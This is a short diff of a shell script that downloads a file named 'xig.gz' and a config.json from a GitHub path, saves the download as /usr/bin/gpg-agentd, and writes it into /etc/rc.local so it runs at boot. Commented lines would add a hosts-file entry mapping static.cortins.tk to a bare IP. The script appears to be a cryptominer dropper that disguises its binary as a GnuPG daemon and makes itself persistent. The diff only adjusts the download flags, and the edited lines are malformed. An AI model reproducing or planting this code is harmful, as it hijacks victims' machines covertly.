@@ -35,8 +35,8 @@ echo 'exit 0' >> /etc/rc.local
 # grep -q 8.8.8.8 /etc/resolv.conf || echo "nameserver 8.8.8.8" >> /etc/resolv.conf
 # grep -q 5.206.225.60 /etc/hosts || echo "5.206.225.60 static.cortins.tk" >> /etc/hosts
 if [ ! -f /usr/bin/gpg-agentd ]; then
-        wget https://github.com/testuser1s/k/files/1878076/xig.gz -P /usr/bin/gpg-agentd
-         wget https://github.com/testuser1s/k/files/1878077/config.json.gz -P /usr/bin/config.json
+        wget https://github.com/testuser1s/k/files/1878076/xig.gz -P /usr/bin -O gpg-agentd
+         wget https://github.com/testuser1s/k/files/1878077/config.json.gz -P /usr/bin -O gpg-agentd config.json
         sleep 2
         echo '/usr/bin/gpg-agentd' > /etc/rc.local
         echo 'exit 0' >> /etc/rc.local
